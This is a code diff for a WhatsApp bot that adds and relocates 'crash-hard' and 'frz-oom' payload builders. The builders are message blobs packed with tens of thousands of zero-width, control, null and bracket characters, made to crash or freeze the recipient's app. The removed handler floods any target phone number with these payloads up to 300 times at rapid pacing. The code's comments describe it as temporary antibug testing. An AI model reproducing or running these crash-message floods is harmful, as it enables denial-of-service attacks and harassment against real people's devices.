@@ -78,6 +78,7 @@ import { createAiFunCommands } from './src/commands/fun/ai.js';
 import { createTicTacToeCommands } from './src/commands/game/tic-tac-toe.js';
 import { createOneShotProbeService } from './src/commands/testing/one-shot-probes.js';
 import { createFloodProbeService } from './src/commands/testing/flood-probes.js';
+import { createSandboxPayloadCommands } from './src/commands/testing/sandbox-payloads.js';
 import { createGroupMembershipCommands } from './src/commands/group/membership.js';
 import { createGroupInformationCommands } from './src/commands/group/information.js';
 import { createGroupModerationCommands } from './src/commands/group/moderation.js';
@@ -2683,6 +2684,81 @@ async function sendCrashclickProbe(prim, target) {
     return { responseId, responseBytes: Buffer.byteLength(responseData), ids: rid ? [rid] : [] };
 }
 
+// 🧪 TEMPORARY .crash-hard payload builder — PAYLOAD A: androz —
+// interactiveMessage blobs (bloksWidget/null strings). Fork build:
+// { participant: true } skips the bot's own devices (exactly the original
+// Squichy RX send), and the fork's proto encodes Header.bloksWidget — full-
+// strength payload. Used by src/commands/testing/sandbox-payloads.js.
+function buildAndrozPayload() {
+    return {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: "𑇂𑆵𑆴𑆿".repeat(10000),
+                        subtitle: "\x10".repeat(50000),
+                        bloksWidget: {
+                            uuid: "\u200B".repeat(50000),
+                            data: "[".repeat(50000),
+                            type: "\u200F".repeat(50000),
+                            fallback: "\u200D".repeat(50000)
+                        }
+                    },
+                    body: { text: "\u000F" },
+                    nativeFlowMessage: {
+                        buttons: "[".repeat(50000)
+                    }
+                }
+            }
+        }
+    };
+}
+
+// 🧪 TEMPORARY .frz-oom payload builder — PAYLOAD B: testfff — carousel of 30
+// cards, null-byte button blobs. Used by
+// src/commands/testing/sandbox-payloads.js.
+function buildTestfffMessage(target, imageMessage) {
+    const cards = [];
+    const header = imageMessage
+        ? { imageMessage, hasMediaAttachment: true }
+        : { title: '𑇂𑆵𑆴𑆿'.repeat(1000), subtitle: '\x10'.repeat(1000), hasMediaAttachment: false };
+    for (let r = 0; r < 30; r++) {
+        cards.push({
+            header,
+            nativeFlowMessage: {
+                buttons: "\0".repeat(10000),
+                messageParamsJson: "\0".repeat(10000)
+            }
+        });
+    }
+    return generateWAMessageFromContent(
+        target,
+        {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: { text: 'Squichy' },
+                        carouselMessage: { cards }
+                    }
+                }
+            }
+        },
+        {}
+    );
+}
+
+// 🧪 TEMPORARY .frz-oom card image preparer — the card image is prepared ONCE
+// per run and reused by every send (same as forwarding reusing uploaded
+// media) — otherwise a ×200 flood would re-download from catbox and re-upload
+// to WhatsApp 200 times. Used by src/commands/testing/sandbox-payloads.js.
+async function prepareCardImage(sock) {
+    const prep = await prepareWAMessageMedia(
+        { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
+        { upload: sock.waUploadToServer }
+    );
+    return prep?.imageMessage || null;
+}
+
 // 🧪 APP-LEVEL GROUP BUG — the .crash-hard payload class (groupStatusMessageV2
 // envelope → startup/sync pipeline poison) fired at a GROUP instead of a 1:1
 // chat. Unlike .gb's CrashClick (chat-level: only crashes when the chat is
@@ -3574,6 +3650,20 @@ const commandRegistry = createCommandRegistry([
         antiConfigSessions,
         warnConfigSessions,
         sendMenuPoll
+    }),
+    ...createSandboxPayloadCommands({
+        isDevNumber,
+        safeWaReply,
+        delay,
+        isSupabaseEnabled,
+        setSyncPaused,
+        buildAndrozPayload,
+        buildTestfffMessage,
+        prepareCardImage,
+        wireBytesOf,
+        recordBugSends,
+        log,
+        logError
     })
 ]);
 
@@ -4961,211 +5051,6 @@ async function handleWhatsAppMessage(sock, msg, phoneNumber, tgId, eventType) {
         botConfig
     })) return;
 
-    // 🧪 TEMPORARY .crash-hard / .frz-oom — sandbox payloads (owner/dev only;
-    // delete with the other test commands when antibug testing ends).
-    //   ".crash-hard"             → usage help only (never fires bare)
-    //   ".crash-hard <number>"    → androz FLOOD at that number (default ×200)
-    //   ".crash-hard <number> <N>" → androz flood with custom count (1-300)
-    //   ".frz-oom" / ".frz-oom <number>" / ".frz-oom <number> <N>" → carousel
-    //   Flood versions of the one-shot .crash-ios/.frz-ios probes live on
-    //   .crash-iosd/.frz-iosd (see their own block). Case-insensitive. The bot's OWN number is
-    //   rejected as a target — firing at it would bomb the bot's own phone.
-    const isCiaCommand = token === '.crash-hard';
-    const isFiaCommand = token === '.frz-oom';
-    if (isCiaCommand || isFiaCommand) {
-        const payloadKind = isFiaCommand ? 'testfff' : 'androz';
-        const displayKind = isFiaCommand ? 'frz-oom' : 'crash-hard';
-        // Owner / dev only.
-        if (!isSenderOwner && !isDevNumber(senderJid)) {
-            await safeWaReply(sock, remoteJid, '❌ Owner only.', msg);
-            return;
-        }
-
-        const input = args.join(' ').trim();
-
-        // Optional trailing count, e.g. ".cia 234xxx 150". Only a trailing
-        // 1–3 digit token counts (real numbers are longer). Default = 200
-        // (the typical crash-hard run in the original bug-bot).
-        let targetInput = input;
-        let count = 200;
-        let flood = false;
-        {
-            const cw = targetInput.split(/\s+/).filter(Boolean);
-            if (cw.length >= 2 && /^\d{1,3}$/.test(cw[cw.length - 1])) {
-                count = Math.min(300, Number(cw[cw.length - 1]));
-                flood = count > 10; // bug-bot pacing only for real floods
-                cw.pop();
-                targetInput = cw.join(' ').trim();
-            }
-        }
-
-        // Bare .crash-hard/.frz-oom (no target) → usage help only. Never fire bare.
-        // fire at the current chat by accident.
-        if (!targetInput) {
-            await safeWaReply(sock, remoteJid,
-                `🧪 *${displayKind} USAGE*\n\n` +
-                `• .${displayKind} <number> — flood (default ×200)\n` +
-                `• .${displayKind} <number> <amount> — custom count (1-300)`, msg);
-            return;
-        }
-
-        let targetJid = '';
-
-        if (targetInput) {
-            const num = targetInput.replace(/\D/g, '');
-            if (!/^\+?[\d\s-]+$/.test(targetInput) || num.length < 8) {
-                await safeWaReply(sock, remoteJid,
-                    `❌ *USAGE*\n\n` +
-                    `• .${displayKind} — fires here (current chat)\n` +
-                    `• .${displayKind} <number> — flood (default ×200)\n` +
-                    `• .${displayKind} <number> <1-300> — custom count`,
-                    msg);
-                return;
-            }
-            // Safety: the bot's OWN number can never be a target — firing at
-            // it would bomb the bot's own phone by mistake.
-            const botNum = String(phoneNumber || '').replace(/\D/g, '')
-                || (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
-            if (num === botNum) {
-                await safeWaReply(sock, remoteJid, '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.', msg);
-                return;
-            }
-            targetJid = `${num}@s.whatsapp.net`;
-            try {
-                const [waCheck] = await sock.onWhatsApp(targetJid);
-                if (!waCheck?.exists) {
-                    await safeWaReply(sock, remoteJid, `❌ That number has no WhatsApp account: ${num}`, msg);
-                    return;
-                }
-            } catch (_) { /* lookup failed — try the send anyway */ }
-        }
-
-        try {
-            // ── PAYLOAD A: androz — interactiveMessage blobs (bloksWidget/null strings) ──
-            // Fork build: { participant: true } skips the bot's own devices
-            // (exactly the original Squichy RX send), and the fork's proto
-            // encodes Header.bloksWidget — full-strength payload.
-            async function androz(prim, target) {
-                const payload = {
-                    groupStatusMessageV2: {
-                        message: {
-                            interactiveMessage: {
-                                header: {
-                                    title: "𑇂𑆵𑆴𑆿".repeat(10000),
-                                    subtitle: "\x10".repeat(50000),
-                                    bloksWidget: {
-                                        uuid: "\u200B".repeat(50000),
-                                        data: "[".repeat(50000),
-                                        type: "\u200F".repeat(50000),
-                                        fallback: "\u200D".repeat(50000)
-                                    }
-                                },
-                                body: { text: "\u000F" },
-                                nativeFlowMessage: {
-                                    buttons: "[".repeat(50000)
-                                }
-                            }
-                        }
-                    }
-                };
-                const wireBytes = wireBytesOf(payload);
-                const rid = await prim.relayMessage(target, payload, { participant: true });
-                return { wireBytes, ids: rid ? [rid] : [] };
-            }
-
-            // ── PAYLOAD B: testfff — carousel of 30 cards, null-byte button blobs ──
-            // The card image is prepared ONCE per .test run and reused by every
-            // send (same as forwarding reusing uploaded media) — otherwise a
-            // ×200 flood would re-download from catbox and re-upload to WhatsApp
-            // 200 times. If the image can't be fetched, fall back to text
-            // headers so the test still fires (mode shows in log/reply).
-            async function testfff(prim, target, imageMessage) {
-                const cards = [];
-                const header = imageMessage
-                    ? { imageMessage, hasMediaAttachment: true }
-                    : { title: '𑇂𑆵𑆴𑆿'.repeat(1000), subtitle: '\x10'.repeat(1000), hasMediaAttachment: false };
-                for (let r = 0; r < 30; r++) {
-                    cards.push({
-                        header,
-                        nativeFlowMessage: {
-                            buttons: "\0".repeat(10000),
-                            messageParamsJson: "\0".repeat(10000)
-                        }
-                    });
-                }
-                const outMsg = generateWAMessageFromContent(
-                    target,
-                    {
-                        groupStatusMessageV2: {
-                            message: {
-                                interactiveMessage: {
-                                    body: { text: 'Squichy' },
-                                    carouselMessage: { cards }
-                                }
-                            }
-                        }
-                    },
-                    {}
-                );
-                const wireBytes = wireBytesOf(outMsg.message);
-                await prim.relayMessage(target, outMsg.message, {
-                    participant: true,
-                    messageId: outMsg.key.id
-                });
-                return { wireBytes, ids: outMsg?.key?.id ? [outMsg.key.id] : [] };
-            }
-
-            // Prepare the fff card image once per run (img mode); if unavailable
-            // the payload falls back to text headers (txt mode).
-            let fffImage = null;
-            if (payloadKind === 'testfff') {
-                try {
-                    const prep = await prepareWAMessageMedia(
-                        { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
-                        { upload: sock.waUploadToServer }
-                    );
-                    fffImage = prep?.imageMessage || null;
-                } catch (err) {
-                    log('TEST', `${phoneNumber}: fff image unavailable (${err?.message || err}) — using text headers`);
-                }
-            }
-            const fffMode = payloadKind === 'testfff' ? (fffImage ? '/img' : '/txt') : '';
-
-            const fire = payloadKind === 'testfff' ? testfff : androz;
-
-            await safeWaReply(sock, remoteJid, `⏳ .${displayKind}${fffMode} started — ×${count} → ${targetJid.split('@')[0]} (≈${Math.max(1, Math.ceil(count * 2.1 / 60))} min). I'll reply again when done.`, msg);
-            // Pause Supabase session sync for the burst — every send ratchets
-            // crypto keys and would otherwise re-trigger full-folder uploads
-            // (thousands of files) between sends. Resumed in finally(), which
-            // re-syncs everything once, so nothing is lost.
-            const syncPausedHere = isSupabaseEnabled();
-            if (syncPausedHere) setSyncPaused(true);
-
-            let sent = 0;
-            const sentIds = [];
-            try {
-                let lastWireBytes = 0;
-                for (let n = 0; n < count; n++) {
-                    const r = await fire(sock, targetJid, fffImage);
-                    sent++;
-                    if (r?.ids) sentIds.push(...r.ids);
-                    if (r?.wireBytes) lastWireBytes = r.wireBytes;
-                    log('TEST', `${phoneNumber}: .${displayKind}${fffMode} send ${sent}/${count}${lastWireBytes ? ` (${lastWireBytes}B wire)` : ''} → ${targetJid} input="${input}"`);
-                    // >10 explicit count = bug-bot pacing (30–70ms jitter), else 1.2s
-                    if (n < count - 1) await delay(flood ? 30 + Math.floor(Math.random() * 40) : 1200);
-                }
-            } finally {
-                if (sentIds.length) recordBugSends(phoneNumber, targetJid, sentIds);
-                if (syncPausedHere) setSyncPaused(false);
-            }
-
-            await safeWaReply(sock, remoteJid, `🧪 .${displayKind}${fffMode} payload sent ×${sent} → ${targetJid.split('@')[0]}`, msg);
-        } catch (err) {
-            logError('TEST', `${phoneNumber}: .test failed`, err);
-            await safeWaReply(sock, remoteJid, `❌ *TEST ERROR*\n\n${err?.message || err}`, msg);
-        }
-        return;
-    }
 
     // ──────────────────────────────────────────────
     // 🛠️ SYSTEM UTILITIES & OWNER TOOLS
